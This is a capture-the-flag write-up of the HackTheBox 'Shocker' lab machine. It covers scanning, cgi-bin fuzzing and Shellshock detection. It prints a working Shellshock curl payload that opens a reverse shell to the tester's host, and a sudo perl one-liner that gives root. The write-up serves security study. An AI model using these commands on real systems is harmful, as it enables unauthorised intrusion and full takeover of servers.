---
title: Shocker Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

The nmap reports that the machine has a web page and SSH service open.
```ruby
# Nmap 7.93 scan initiated Sun Jan 29 13:11:27 2023 as: nmap -p80,2222 -sCV -oN targeted 10.129.228.21
Nmap scan report for 10.129.228.21
Host is up (0.061s latency).

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 c4f8ade8f80477decf150d630a187e49 (RSA)
| | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 29 13:11:36 2023 -- 1 IP address (1 host up) scanned in 8.57 seconds
```

So let's fuzz it. Using dirbuster, we didn't find any subdomains. Let's try looking for files on it.

```shell
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/wfuzz/general/medium.txt http://10.129.228.21/FUZZ/
```

We found cgi-bin and cgi-bin/ but they are forbiden. Anyway, let's fuzz them anyway BUT THIS TIME LOOKING FOR FILES, since CGI-BIN usually stores files.

```shell
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.129.228.21/cgi-bin/FUZZ.FUZ2Z         
```

We see that we found a user-sh file so let's investigate it. It has no information, but when you find this kind of thing (sh-files inside the cgi-bin) you can try a shellshock.

So let's see if our page is vulnerable to shell-shock:
```shell
sudo nmap --script http-shell-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.129.228.21

# --script http-shellshock -> To use the shell-shock script
# --script-args -> Pass arguments to the script
# uri =/ -> Specify the path where user.sh resides
```

And it reports this:
```ruby
PORT STATE SERVICE
80/tcp open http
| http-shellshock: 
| VULNERABLE:
| HTTP Shellshock vulnerability
| State: VULNERABLE (Exploitable)
| IDs: CVE:CVE-2014-6271
| This web application might be affected by the vulnerability known
| as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers.
| via malicious HTTP headers.
|             
| Disclosure date: 2014-09-24
| References:
| http://www.openwall.com/lists/oss-security/2014/09/24/10
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
| http://seclists.org/oss-sec/2014/q3/685
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```

## User exploit

Now that we know it is vulnerable, we can apply a shell-shock attack.

By applying this command, we send a reverse shell to ourselves

```shell
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.38/443 0>&1" http://10.129.228.21/cgi-bin/user.sh
```

## Root Exploit

Doing sudo -l, we see that we can run perl as root, so let's look for a way to do the priv. esc. in gtfobins

We find the following command:
```shell
perl -e 'exec "/bin/sh";'
```

so we run it as sudo and we are root.

